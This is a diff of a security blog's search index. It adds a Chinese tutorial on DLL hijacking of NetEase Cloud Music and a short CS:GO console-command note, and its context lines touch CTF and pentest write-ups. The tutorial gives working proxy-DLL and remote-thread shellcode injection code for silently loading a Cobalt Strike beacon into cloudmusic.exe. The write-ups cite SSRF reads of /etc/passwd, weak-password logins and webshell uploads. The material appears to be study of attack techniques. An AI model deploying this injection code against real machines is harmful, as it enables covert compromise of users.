@@ -1,6 +1,117 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Csgo2 内存解析</title>
+    <url>/2024/03/25/Reverse/csgo%E7%BB%93%E6%9E%84%E4%BD%93/</url>
+    <content><![CDATA[<p>首先熟悉一下csgo的指令，方便我们后面调试：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sv_cheats 1                # 作弊模式开启</span><br><span class="line">bot_stop 1                 # bot停止移动</span><br><span class="line">mp_roundtime_defuse 60     # 设置回合时间为60分钟</span><br><span class="line">mp_restartgame 1           # 1秒后刷新游戏</span><br><span class="line">hurtme 2                   # 攻击自己2滴血</span><br><span class="line">mp_startmoney 16000        # 出生金钱为16000</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Reverse</category>
+      </categories>
+      <tags>
+        <tag>Csgo2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DLL 劫持详解</title>
+    <url>/2024/03/22/Virus%20AV/DLL%E5%8A%AB%E6%8C%81/</url>
+    <content><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>在正式开始之前需要理解DLL导出函数的过程和原理，首先VS创建一个DLL工程，尝试导出一个函数。</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 以C语言格式导出</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function"><span class="type">int</span> <span class="title">TestFunction</span><span class="params">(<span class="type">int</span> sin)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> sin + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中 <strong>DllMain</strong> 是DLL的入口函数，switch 中的四个分支的含义如下：</p>
+<ul>
+<li>DLL_PROCESS_ATTACH：当进程加载DLL时进入</li>
+<li>DLL_THREAD_ATTACH：当进程创建一个新线程时进入</li>
+<li>DLL_THREAD_DETACH：当线程正常退出或终止时进入</li>
+<li>DLL_PROCESS_DETACH：当DLL从进程中退出时进入</li>
+</ul>
+<p>生成一下，我们可以在CFF中看到导出的函数：</p>
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20240319160230421.png" alt="image-20240319160230421"></p>
+<p>为什么要用C语言格式导出，而不是直接导出，像下面这样：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 以C++语言格式导出</span></span><br><span class="line">__declspec(dllexport) <span class="function"><span class="type">int</span> <span class="title">TestFunction</span><span class="params">(<span class="type">int</span> sin)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> sin + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20240319160354088.png" alt="image-20240319160354088"></p>
+<p>发现导出表出现了变化。这是因为 C++ 编译器会对函数名称进行名称修饰或名称变形（Name Mangling），以编码函数的参数类型、数量以及所属类等信息。这使得同一个函数名在不同的编译器甚至同一个编译器的不同版本之间可能有不同的内部表示，从而导致链接问题。所以我们才需要使用C语言的格式进行导出。</p>
+<p>接下来是使用DLL中导出的函数：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义函数指针</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*TestFunction)</span><span class="params">(<span class="type">int</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// 获取DLL模块</span></span><br><span class="line">	HMODULE <span class="keyword">module</span> = <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;InvokeDLL.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 获取DLL模块中的函数地址</span></span><br><span class="line">	TestFunction testFunction = (TestFunction)<span class="built_in">GetProcAddress</span>(<span class="keyword">module</span>, <span class="string">&quot;TestFunction&quot;</span>);</span><br><span class="line">    </span><br><span class="line">	<span class="type">int</span> result = <span class="built_in">testFunction</span>(<span class="number">2</span>);</span><br><span class="line">	std::cout &lt;&lt; result &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>注意导出函数和调用函数的<strong>调用约定</strong>要相同；注意<strong>不同编译环境</strong>下的DLL和Loader不能使用，比如Debug版本和Release版本会有冲突，需要统一。</p>
+<p>Windows下动态链接库的搜索顺序：</p>
+<ul>
+<li>可执行文件所在的目录（当前目录）</li>
+<li>Windows的系统目录（该目录可以通过GetSystemDirectory函数获得）</li>
+<li>16位的系统目录（Windows目录下的system子目录）</li>
+<li>Windows目录（该目录可以通过GetWindowsDirectory函数获得）</li>
+<li>进程当前所在的工作目录</li>
+<li>PATH环境变量中所列出的目录。</li>
+</ul>
+<p>当然也存在一些无法劫持的DLL，在系统注册表中标明：</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">reg query <span class="string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Session Manager\KnownDLLs&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="劫持不存在的DLL"><a href="#劫持不存在的DLL" class="headerlink" title="劫持不存在的DLL"></a>劫持不存在的DLL</h2><p>选择网易云音乐（版本：2.10.13）作为劫持的目标进行学习。劫持不存在的DLL就是指当程序运行时会尝试加载一些不存在的DLL，通过劫持这类DLL，并且在 DLLMain 的 DLL_PROCESS_ATTACH 中写入恶意代码，就能够成功执行。</p>
+<p>先看一下网易云音乐的进程名。</p>
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20240320134114647.png" alt="image-20240320134114647"></p>
+<p>再在 Process Monitor 中过滤一下，找不存在的DLL。</p>
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20240320134225128.png" alt="image-20240320134225128"></p>
+<p>主要针对应用目录进行查找。需要满足堆栈中有调用过 <strong>LoadLibrary</strong> 系列函数的，如下图所示：</p>
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20240320142151538.png" alt="image-20240320142151538"></p>
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20240320142410270.png" alt="image-20240320142410270"></p>
+<p>DLL存在两种加载方式：<strong>静态加载（或预加载）</strong>和<strong>动态加载</strong>。静态加载是指应用程序启动时，操作系统按照应用程序的导入表自动加载所需的 DLL。而动态加载是指应用程序在运行时通过调用 <strong>LoadLibrary</strong> 或相关 API 动态地加载 DLL。</p>
+<p>编写DLL尝试劫持：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        <span class="built_in">WinExec</span>(<span class="string">&quot;calc.exe&quot;</span>, SW_SHOWNORMAL);</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>需要注意网易云音乐的架构是x86的还是x64的，按照对应的架构进行编译。</strong></p>
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20240320163814332.png" alt="image-20240320163814332"></p>
+<p>成功弹出计算器。</p>
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20240320163602906.png" alt="image-20240320163602906"></p>
+<p>接下来尝试上线CS。如果在DLLMain中创建新线程会产生<strong>DLLMain死锁</strong>，永久等待。引用下面文章的一句话：在DllMain内部应该避免任何<strong>Wait</strong>调用。但是进程互斥对象的问题不仅仅限于Wait系列函数。操作系统在CreateProcess、GetModuleFileName、GetProcAddress、wglMakeCurrent、LoadLibrary和FreeLibrary等函数中在后台获取进程互斥对象，因此在DllMain中不应该调用任何这些函数。</p>
+<blockquote>
+<p>DLLMain和多线程死锁：<a href="https://developer.aliyun.com/article/317704">https://developer.aliyun.com/article/317704</a></p>
+<p>DllMain中不当操作导致死锁：<a href="https://blog.csdn.net/breaksoftware/article/details/8142339">https://blog.csdn.net/breaksoftware/article/details/8142339</a></p>
+</blockquote>
+<p>所以我采取了远程线程注入自身进程，也就是<strong>cloudmusic.exe</strong>进程，同时避免使用<strong>WaitForSingleObject</strong>函数防止发生死锁。但是这种方法存在一个问题，当Beacon退出的时候，软件会随着关闭。</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> hexData[<span class="number">223368</span>] = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">getInjectProcess</span><span class="params">(<span class="type">wchar_t</span>* name)</span> </span>&#123;</span><br><span class="line">    PROCESSENTRY32 lppe = &#123; <span class="built_in">sizeof</span>(lppe) &#125;;</span><br><span class="line"></span><br><span class="line">    HANDLE handle = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPALL, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (handle != INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        BOOL ret = <span class="built_in">Process32First</span>(handle, &amp;lppe);</span><br><span class="line">        <span class="keyword">while</span> (ret) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">wcscmp</span>(name, lppe.szExeFile)) &#123;</span><br><span class="line">                <span class="built_in">CloseHandle</span>(handle);</span><br><span class="line">                std::cout &lt;&lt; <span class="string">&quot;Get Process ID: &quot;</span> &lt;&lt; lppe.th32ProcessID &lt;&lt; std::endl;</span><br><span class="line">                <span class="keyword">return</span> lppe.th32ProcessID;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// std::wcout &lt;&lt; lppe.szExeFile &lt;&lt; L&quot; : &quot; &lt;&lt; lppe.th32ProcessID &lt;&lt; std::endl;</span></span><br><span class="line">            ret = <span class="built_in">Process32Next</span>(handle, &amp;lppe);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CloseHandle</span>(handle);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">RemoteThreadInject</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">wchar_t</span> name[] = <span class="string">L&quot;cloudmusic.exe&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> processId = <span class="built_in">getInjectProcess</span>(name);</span><br><span class="line">    <span class="keyword">if</span> (processId &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Get Process Error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    HANDLE process = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class="literal">true</span>, processId);</span><br><span class="line">    <span class="keyword">if</span> (!process) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;OpenProcess Error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    LPVOID lpAddress = <span class="built_in">VirtualAllocEx</span>(process, <span class="literal">NULL</span>, <span class="built_in">sizeof</span>(hexData), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (!lpAddress) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;VirtualAllocEx Error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(process, lpAddress, hexData, <span class="built_in">sizeof</span>(hexData), <span class="literal">NULL</span>);</span><br><span class="line">    HANDLE hThread = <span class="built_in">CreateRemoteThread</span>(process, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)lpAddress, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// WaitForSingleObject(hThread, INFINITE);</span></span><br><span class="line">    <span class="built_in">CloseHandle</span>(process);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH: &#123;</span><br><span class="line">        <span class="built_in">RemoteThreadInject</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最终实现网易云音乐无感上线。</p>
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20240320164943908.png" alt="image-20240320164943908"></p>
+<h2 id="劫持存在的DLL"><a href="#劫持存在的DLL" class="headerlink" title="劫持存在的DLL"></a>劫持存在的DLL</h2><p>同样选择网易云音乐（版本：2.10.13）作为劫持的目标进行学习。劫持存在的DLL就是指当程序运行时会加载一些存在的DLL，通过劫持这类DLL的导出函数，并进行转发，最终实现无感上线。这种方法相较于前者<strong>不会发生DLLMain死锁</strong>的情况。</p>
+<p>在 Process Monitor 中过滤一下，找存在的DLL。</p>
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20240320171731837.png" alt="image-20240320171731837"></p>
+<p>同样找应用目录的，但是不一定需要调用 LoadLibrary 函数的。</p>
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20240321094346532.png" alt="image-20240321094346532"></p>
+<p>这里利用 AheadLib+ 工具进行自动化劫持，主要分为<strong>直接转发</strong>和<strong>间接转发</strong>。</p>
+<h3 id="直接转发"><a href="#直接转发" class="headerlink" title="直接转发"></a>直接转发</h3><p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20240321094741645.png" alt="image-20240321094741645"></p>
+<p>直接看生成的关键代码：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/EXPORT:swr_alloc=swresample-3Org.swr_alloc,@1&quot;</span>)</span></span><br></pre></td></tr></table></figure>
+
+<p>程序通过指定链接器将导出函数指向源DLL中，实现了直接转发。但这种转发<strong>只允许我们在DLLMain中动手脚</strong>，同时由于程序可能会多次加载DLL，导致重复上线。尝试弹计算机。</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(HMODULE hModule, DWORD dwReason, PVOID pvReserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (dwReason == DLL_PROCESS_ATTACH)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">DisableThreadLibraryCalls</span>(hModule);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (dwReason == DLL_PROCESS_DETACH)</span><br><span class="line">	&#123;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译后将DLL放入应用目录下，并将源DLL该名成 AheadLib+ 给我们的名字。成功弹出计算机。</p>
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20240321095307013.png" alt="image-20240321095307013"></p>
+<h3 id="间接转发"><a href="#间接转发" class="headerlink" title="间接转发"></a>间接转发</h3><p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20240321101134021.png" alt="image-20240321101134021"></p>
+<p>来看源代码，作者实现了一个 GetAddress 函数，用于获取源DLL中的导出函数地址。</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取原始函数地址</span></span><br><span class="line"><span class="function">FARPROC WINAPI <span class="title">GetAddress</span><span class="params">(PCSTR pszProcName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FARPROC fpAddress;</span><br><span class="line">    CHAR szProcName[<span class="number">16</span>];</span><br><span class="line">    TCHAR tzTemp[MAX_PATH];</span><br><span class="line"></span><br><span class="line">    fpAddress = <span class="built_in">GetProcAddress</span>(m_hModule, pszProcName);</span><br><span class="line">    <span class="keyword">if</span> (fpAddress == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">HIWORD</span>(pszProcName) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">wsprintfA</span>(szProcName, <span class="string">&quot;%d&quot;</span>, pszProcName);</span><br><span class="line">            pszProcName = szProcName;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">wsprintf</span>(tzTemp, <span class="built_in">TEXT</span>(<span class="string">&quot;无法找到函数 %hs，程序无法正常运行。&quot;</span>), pszProcName);</span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, tzTemp, <span class="built_in">TEXT</span>(<span class="string">&quot;AheadLib&quot;</span>), MB_ICONSTOP);</span><br><span class="line">        <span class="built_in">ExitProcess</span>(<span class="number">-2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> fpAddress;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后导出自定义的函数，用于跳转至对应的函数指针上。</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">ALCDECL <span class="title">AheadLib_swr_alloc</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__asm JMP pfnswr_alloc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过指定链接器将导出函数指向自实现的函数上，就实现了即时转发。</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/EXPORT:swr_alloc=_AheadLib_swr_alloc,@1&quot;</span>)</span></span><br></pre></td></tr></table></figure>
+
+<p>我们可以在DLLMain中进行劫持，也可以在导出函数中做手脚。后者的利用难度更大，因为并不是DLL中所有的函数都会被调用，这就需要在堆栈中寻找被调用过的函数。我暂时还没能找到可以劫持的函数，所以就以劫持DLLMain尝试上线CS。为了规避DLLMain死锁，依然采取远程线程注入的方式，还是会在CS上线多次。</p>
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20240321150452121.png" alt="image-20240321150452121"></p>
+]]></content>
+      <categories>
+        <category>Virus AV</category>
+      </categories>
+      <tags>
+        <tag>DLL</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>浅谈 Shellcode 加密</title>
     <url>/2024/03/18/Virus%20AV/Shellcode%E5%8A%A0%E5%AF%86/</url>
     <content><![CDATA[<p>常用的编码和加密方式有 Xor、Base64、AES、RC4、RSA 等等。对于这些加密的方式，我们可以通过调用库来实现，但这并不符合Opsec的规范，杀软会对API的调用进行检查，所以采用自实现加密的方式变得更加Opsec一点。除此以外，为了降低程序的熵值，我们通常会把shellcode转化成 UUID、IPV4地址或者是IPV6地址，甚至是英文单词，也可以填充一些垃圾代码。</p>
@@ -81,14 +192,14 @@
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">vim.basic /root/flag/flag01.txt</span><br></pre></td></tr></table></figure>
 
 <h2 id="Flag2"><a href="#Flag2" class="headerlink" title="Flag2"></a>Flag2</h2><p>进行内网信息的收集，先看看网卡。</p>
-<p><img src="C:\Users\13106\AppData\Roaming\Typora\typora-user-images\image-20240316160258993.png" alt="image-20240316160258993"></p>
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20240319085431827.png" alt="image-20240319085431827"></p>
 <p>上fscan扫一波，发现了两个主机172.30.12.236和172.30.12.6。</p>
 <p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20240316163232417.png" alt="image-20240316163232417"></p>
 <p>先来搞172.30.12.6。msf上一下代理。</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run post/multi/manage/autoroute</span><br><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20240316165641372.png" alt="image-20240316165641372"></p>
-<p>从fscan的结果来看发现是nacos，访问 <a href="http://172.30.12.6:8848/nacos/%E3%80%82">http://172.30.12.6:8848/nacos/。</a></p>
+<p>从fscan的结果来看发现是nacos，访问 <a href="http://172.30.12.6:8848/nacos/">http://172.30.12.6:8848/nacos/</a></p>
 <h2 id="Flag3"><a href="#Flag3" class="headerlink" title="Flag3"></a>Flag3</h2><p>针对172.30.12.236做一个端口的探测。</p>
 <p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20240316173840193.png" alt="image-20240316173840193"></p>
 <h2 id="Flag4"><a href="#Flag4" class="headerlink" title="Flag4"></a>Flag4</h2>]]></content>
@@ -1129,9 +1240,9 @@
     <url>/2023/12/05/Penetration/bugku%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%953/</url>
     <content><![CDATA[<h2 id="场景一"><a href="#场景一" class="headerlink" title="场景一"></a>场景一</h2><p>尝试扫描目录和端口，发现只开启了80端口，目录也没扫出什么东西。在主页抓包试试，发现POST了一个url，判断应该存在ssrf，读&#x2F;etc&#x2F;passwd试试看，成功了。</p>
 <p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231205134403149.png?imageSlim" alt="image-20231205134403149"></p>
-<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231205134604726.png?imageSlim" alt="image-20231205134604726"></p>
 <span id="more"></span>
 
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231205134604726.png?imageSlim" alt="image-20231205134604726"></p>
 <h2 id="场景二、场景三"><a href="#场景二、场景三" class="headerlink" title="场景二、场景三"></a>场景二、场景三</h2><p>因为外网只开了一个80服务，没有什么可打的点，尝试利用ssrf探测内网。先看看hosts文件。</p>
 <p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231205134952040.png?imageSlim" alt="image-20231205134952040"></p>
 <p>发现了一个192.168.0.2的内网，访问192.168.0.2发现就是这个爬取的网页，用ssrf扫一下内网看看。</p>
@@ -3113,10 +3224,10 @@
     <url>/2023/09/23/Penetration/bugku%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951/</url>
     <content><![CDATA[<h2 id="场景1"><a href="#场景1" class="headerlink" title="场景1"></a>场景1</h2><p>看页面源代码就能找到：</p>
 <p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230923131212171.png" alt="image-20230923131212171"></p>
-<h2 id="场景2"><a href="#场景2" class="headerlink" title="场景2"></a>场景2</h2><p>根据提示访问&#x2F;admin试试看，找到登陆页面，尝试弱口令直接嗦admin&#x2F;admin，拿到管理员权限。</p>
-<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230923131800470.png" alt="image-20230923131800470"></p>
 <span id="more"></span>
 
+<h2 id="场景2"><a href="#场景2" class="headerlink" title="场景2"></a>场景2</h2><p>根据提示访问&#x2F;admin试试看，找到登陆页面，尝试弱口令直接嗦admin&#x2F;admin，拿到管理员权限。</p>
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230923131800470.png" alt="image-20230923131800470"></p>
 <h2 id="场景3"><a href="#场景3" class="headerlink" title="场景3"></a>场景3</h2><p>尝试修改上传后缀上传木马，能够成功上传，但是似乎会将php代码注释成html返回给我们，失败。</p>
 <p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230923133456530.png" alt="image-20230923133456530"></p>
 <p>在php教程发现将我们修改的代码上传成php文件，拿到shell和flag。</p>
